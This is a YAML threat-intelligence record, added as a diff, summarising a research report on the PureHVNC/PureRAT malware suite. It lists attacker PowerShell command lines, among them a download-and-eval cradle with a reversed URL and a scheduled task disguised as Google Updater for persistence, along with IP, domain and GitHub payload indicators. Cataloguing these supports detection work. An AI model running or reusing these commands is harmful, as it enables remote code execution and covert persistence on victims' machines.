@@ -1,0 +1,78 @@
+description: The report describes a malware family that includes P2P torrent capabilities,
+  clipboard manipulation, remote desktop features, and various persistence mechanisms.
+attribution: PureCoder (malware developer), threat actors using the suite
+malware_families:
+- PureHVNC
+- PureHVNC RAT
+- PureCrypter
+- PureLogs
+- PureRAT
+TTPs:
+  processes: []
+  commandline:
+  - powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript
+    $j"
+  - powershell -Command " while ($true) { try { Start-Process -FilePath 'cmd.exe'
+    ` -Verb runas ` -ArgumentList '/c start \"\" /B \"regsvr32.exe\" {MALWARE} /i:--type=renderer';
+    exit } catch {} } "
+  - powershell -Command " if ( Get-ScheduledTask | Where-Object { $_.Actions.Execute
+    -eq 'regsvr32' -and $_.Actions.Arguments -eq '/s /i:--type=renderer \"%APPDATA%\Microsoft\SystemCertificates\{MALWARE}\"'
+    } ) { exit 0 } else { exit 1 } "
+  - powershell -NoProfile -NonInteractive -Command -
+  powershell:
+  - $j=$env:TEMP+'\a.js';sc $j 'a=new ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript
+    $j
+  - while ($true) { try { Start-Process -FilePath 'cmd.exe' ` -Verb runas ` -ArgumentList
+    '/c start \"\" /B \"regsvr32.exe\" {MALWARE} /i:--type=renderer'; exit } catch
+    {} }
+  - if ( Get-ScheduledTask | Where-Object { $_.Actions.Execute -eq 'regsvr32' -and
+    $_.Actions.Arguments -eq '/s /i:--type=renderer \"%APPDATA%\Microsoft\SystemCertificates\{MALWARE}\"'
+    } ) { exit 0 } else { exit 1 }
+  - Register-ScheduledTask ` -Action ( New-ScheduledTaskAction ` -Execute "regsvr32"
+    ` -Argument "/s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\{MALWARE}""
+    ) ` -Trigger ( New-ScheduledTaskTrigger ` -Once -At (Get-Date).AddMinutes(1) `
+    -RepetitionInterval (New-TimeSpan -Minutes 1) ) ` -TaskName 'GoogleUpdaterTaskSystem196.6.2928.90.{FD10B0DF-9A2C-41C2-B9E7-3C3C6F193A83}'
+    ` -TaskPath '\GoogleSystem\GoogleUpdater' ` -Description 'GoogleUpdater Task System
+    196.6.2928.90' ` -Settings ( New-ScheduledTaskSettingsSet ` -AllowStartIfOnBatteries
+    ` -DontStopIfGoingOnBatteries ` -ExecutionTimeLimit 0 ` -DontStopOnIdleEnd ) `
+    -RunLevel Highest
+  - -NoProfile -ExecutionPolicy Bypass -Enc <base64-encoded script>
+  scripting_engine: []
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - process: PureHVNC
+    destination: 54.197.141.245
+    ports:
+    - 443
+    - 10443
+  - executable: powershell.exe
+    destination: 54.197.141.245
+    port: ''
+  file_activity:
+  - '%APPDATA%\\Microsoft\\SystemCertificates\\9TwinAPIInterop.pfx'
+  - '%ProgramData%/<domain>_<username>_cred.txt'
+  persistence:
+  - Scheduled Task named 'GoogleUpdaterTaskSystem196.6.2928.90.{FD10B0DF-9A2C-41C2-B9E7-3C3C6F193A83}'
+  - Mutex 'aa05be285061'
+  process_relations: []
+IOCs:
+  hashes: []
+  ips:
+  - 54.197.141.245
+  domains:
+  - stathub.quest
+  - stategiq.quest
+  - mktblend.monster
+  - dsgnfwd.xyz
+  - dndhub.xyz
+  - jq-scripts.global.ssl.fastly.net
+  urls:
+  - https://github.com/DFfe9ewf/test3/raw/refs/heads/main/webbriver.d11
+  - https://github.com/DFfegewf/test3/raw/refs/heads/main/chromedriver.exe
+  - https://github.com/DFfegewf/test3/raw/refs/heads/main/msedgedriver.exe
+authors:
+- Antonis Terefos (@Tera0017)
+reference: https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/
+date_of_publication: September 16, 2025
+file_creation_date: September 22, 2025
